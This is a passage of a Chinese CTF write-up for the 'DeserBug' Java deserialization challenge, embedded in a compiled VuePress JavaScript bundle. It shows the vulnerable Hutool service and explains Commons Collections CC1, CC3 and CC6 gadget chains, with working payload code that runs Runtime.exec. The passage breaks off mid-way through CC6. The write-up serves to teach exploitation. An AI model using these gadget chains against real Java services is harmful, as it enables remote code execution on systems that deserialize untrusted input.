import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as t,o as p}from"./app-ClR9AqGF.js";const o={};function e(c,n){return p(),a("div",null,[...n[0]||(n[0]=[t(`<h1 id="ctf-deserbug" tabindex="-1"><a class="header-anchor" href="#ctf-deserbug"><span>CTF - DeserBug</span></a></h1><h2 id="目录" tabindex="-1"><a class="header-anchor" href="#目录"><span>目录</span></a></h2><ul><li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li><li><a href="#cc%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">CC链基础知识</a><ul><li><a href="#cc1%E9%93%BE%E5%8E%9F%E7%90%86">CC1链原理</a></li><li><a href="#cc3%E9%93%BE%E5%8E%9F%E7%90%86">CC3链原理</a></li><li><a href="#cc6%E9%93%BE%E5%8E%9F%E7%90%86">CC6链原理</a></li></ul></li><li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li><li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li><li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8B%BC%E6%8E%A5%E5%8E%9F%E7%90%86">反序列化链拼接原理</a></li></ul><hr><h2 id="题目分析" tabindex="-1"><a class="header-anchor" href="#题目分析"><span>题目分析</span></a></h2><h3 id="题目环境" tabindex="-1"><a class="header-anchor" href="#题目环境"><span>题目环境</span></a></h3><ul><li><strong>Web服务</strong>: Hutool HTTP Server (端口8888)</li><li><strong>依赖</strong>: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18</li><li><strong>JDK</strong>: JDK1.8.0_202</li><li><strong>提示</strong>: <code>cn.hutool.json.JSONObject.put</code> → <code>com.app.Myexpect#getAnyexcept</code></li></ul><h3 id="题目提供的关键文件" tabindex="-1"><a class="header-anchor" href="#题目提供的关键文件"><span>题目提供的关键文件</span></a></h3><h4 id="_1-testapp-java-存在反序列化漏洞的web服务" tabindex="-1"><a class="header-anchor" href="#_1-testapp-java-存在反序列化漏洞的web服务"><span>1. Testapp.java - 存在反序列化漏洞的Web服务</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Testapp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">HttpUtil</span><span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAction</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> bugstr <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParam</span><span class="token punctuation">(</span><span class="token string">&quot;bugstr&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 【漏洞点】直接反序列化用户输入</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>bugstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 【关键提示】异常处理中使用Myexpect</span>
                <span class="token class-name">Myexpect</span> myexpect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Myexpect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> myexpect<span class="token punctuation">.</span><span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            response<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token class-name">ContentType</span><span class="token punctuation">.</span><span class="token constant">TEXT_PLAIN</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="_2-myexpect-java-题目提供的反射工具类" tabindex="-1"><a class="header-anchor" href="#_2-myexpect-java-题目提供的反射工具类"><span>2. Myexpect.java - 题目提供的反射工具类</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Myexpect</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span> targetclass<span class="token punctuation">;</span>      <span class="token comment">// 目标类</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> typeparam<span class="token punctuation">;</span>      <span class="token comment">// 构造器参数类型</span>
    <span class="token keyword">private</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> typearg<span class="token punctuation">;</span>       <span class="token comment">// 构造器参数值</span>
    
    <span class="token comment">// 【核心方法】通过反射调用任意构造器</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Constructor</span> con <span class="token operator">=</span> targetclass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>typeparam<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>typearg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// Getter/Setter省略...</span>
<span class="token punctuation">}</span>
</code></pre><hr><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2><h3 id="漏洞点" tabindex="-1"><a class="header-anchor" href="#漏洞点"><span>漏洞点</span></a></h3><pre><code class="language-java"><span class="token comment">// Testapp.java - 反序列化入口</span>
<span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 危险的反序列化操作</span>
</code></pre><h3 id="题目约束" tabindex="-1"><a class="header-anchor" href="#题目约束"><span>题目约束</span></a></h3><p>Commons Collections 3.2.2 的安全限制：</p><ul><li>❌ <code>InvokerTransformer</code> - 反射调用方法（已禁用）</li><li>❌ <code>InstantiateTransformer</code> - 反射调用构造器（已禁用）</li><li>✅ <code>ConstantTransformer</code> - 仅返回常量（可用）</li></ul><h3 id="突破点" tabindex="-1"><a class="header-anchor" href="#突破点"><span>突破点</span></a></h3><p>题目提供的 <code>Myexpect</code> 类：</p><ul><li>✅ 可序列化（继承自Exception）</li><li>✅ 提供 <code>getAnyexcept()</code> 方法反射调用任意构造器</li><li>✅ 不受CC 3.2.2安全检查限制</li></ul><p><strong>关键提示</strong>：<code>cn.hutool.json.JSONObject.put</code> → <code>com.app.Myexpect#getAnyexcept</code></p><hr><h2 id="cc链基础知识" tabindex="-1"><a class="header-anchor" href="#cc链基础知识"><span>CC链基础知识</span></a></h2><p>本题目是基于经典的CC1、CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。</p><h3 id="cc1链原理" tabindex="-1"><a class="header-anchor" href="#cc1链原理"><span>CC1链原理</span></a></h3><h4 id="核心组件" tabindex="-1"><a class="header-anchor" href="#核心组件"><span>核心组件</span></a></h4><pre><code class="language-java"><span class="token comment">// 使用 TransformedMap 在 setValue 时触发</span>
<span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;getRuntime&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 使用 AnnotationInvocationHandler 触发</span>
<span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> obj <span class="token operator">=</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><h4 id="调用链" tabindex="-1"><a class="header-anchor" href="#调用链"><span>调用链</span></a></h4><pre><code>AnnotationInvocationHandler.readObject()
  → memberValues.entrySet()遍历
  → TransformedMap.setValue()  // 当key=&quot;value&quot;时触发
    → ChainedTransformer.transform()
      → ConstantTransformer → 返回Runtime.class
      → InvokerTransformer链式调用
        → Runtime.getRuntime().exec() → RCE
</code></pre><h4 id="失效原因" tabindex="-1"><a class="header-anchor" href="#失效原因"><span>失效原因</span></a></h4><p><strong>JDK 8u71+限制</strong>：</p><pre><code class="language-java"><span class="token comment">// AnnotationInvocationHandler.readObject() 在 JDK 8u71+ 中增加了类型检查</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
    <span class="token class-name">AnnotationType</span> annotationType <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        annotationType <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">&quot;Non-annotation type in annotation serial stream&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// ❌ 必须是注解的成员</span>
            <span class="token class-name">Object</span> value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>  <span class="token comment">// 只有这里会调用setValue</span>
                    <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>
                        value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;[&quot;</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">&quot;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><ul><li>只有当key是注解的合法成员时才会触发setValue</li><li>@Retention注解只有value()成员，但value类型是RetentionPolicy枚举，类型不匹配时才会setValue</li><li>高版本JDK对此进行了严格限制，导致CC1失效</li></ul><p><strong>CC 3.2.2限制</strong>：</p><pre><code class="language-java"><span class="token comment">// InvokerTransformer.readObject()</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">FunctorUtils</span><span class="token punctuation">.</span><span class="token function">checkUnsafeSerialization</span><span class="token punctuation">(</span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ❌ 抛异常</span>
<span class="token punctuation">}</span>
</code></pre><hr><h3 id="cc3链原理" tabindex="-1"><a class="header-anchor" href="#cc3链原理"><span>CC3链原理</span></a></h3><h4 id="核心组件-1" tabindex="-1"><a class="header-anchor" href="#核心组件-1"><span>核心组件</span></a></h4><pre><code class="language-java"><span class="token comment">// 使用 InstantiateTransformer 调用构造器</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 使用动态代理触发</span>
<span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// AnnotationInvocationHandler作为InvocationHandler</span>
<span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建代理对象</span>
<span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
    <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    handler
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 再次封装</span>
<span class="token class-name">Object</span> obj <span class="token operator">=</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><h4 id="调用链-1" tabindex="-1"><a class="header-anchor" href="#调用链-1"><span>调用链</span></a></h4><pre><code>AnnotationInvocationHandler.readObject()
  → memberValues.entrySet()  // memberValues是proxyMap
    → 代理对象方法调用
      → AnnotationInvocationHandler.invoke()
        → LazyMap.get()
          → ChainedTransformer.transform()
            → ConstantTransformer → 返回TrAXFilter.class
            → InstantiateTransformer.transform()
              → Constructor.newInstance(templates)  // 反射调用构造器
              → new TrAXFilter(templates)
                → templates.newTransformer() → RCE
</code></pre><h4 id="cc-3-2-2失败原因" tabindex="-1"><a class="header-anchor" href="#cc-3-2-2失败原因"><span>CC 3.2.2失败原因</span></a></h4><p><strong>CC 3.2.2限制</strong>：</p><pre><code class="language-java"><span class="token comment">// InstantiateTransformer.readObject()</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">FunctorUtils</span><span class="token punctuation">.</span><span class="token function">checkUnsafeSerialization</span><span class="token punctuation">(</span><span class="token class-name">InstantiateTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ❌ 抛异常</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>JDK版本限制</strong>：</p><p>虽然CC3使用动态代理绕过了JDK 8u71+对TransformedMap的限制，但在高版本JDK中，AnnotationInvocationHandler的invoke方法也被修改，导致LazyMap.get()无法被触发。本题目使用的是JDK 1.8.0_202，理论上CC3的触发方式仍然可用，但主要问题是InstantiateTransformer被禁用。</p><hr><h3 id="cc6链原理" tabindex="-1"><a class="header-anchor" href="#cc6链原理"><span>CC6链原理</span></a></h3><h4 id="核心组件-2" tabindex="-1"><a class="header-anchor" href="#核心组件-2"><span>核心组件</span></a></h4><pre><code class="language-java"><span class="token comment">// 使用 InvokerTransformer 直接反射调用方法</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// 获取方法</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token comment">// 调用方法</span>
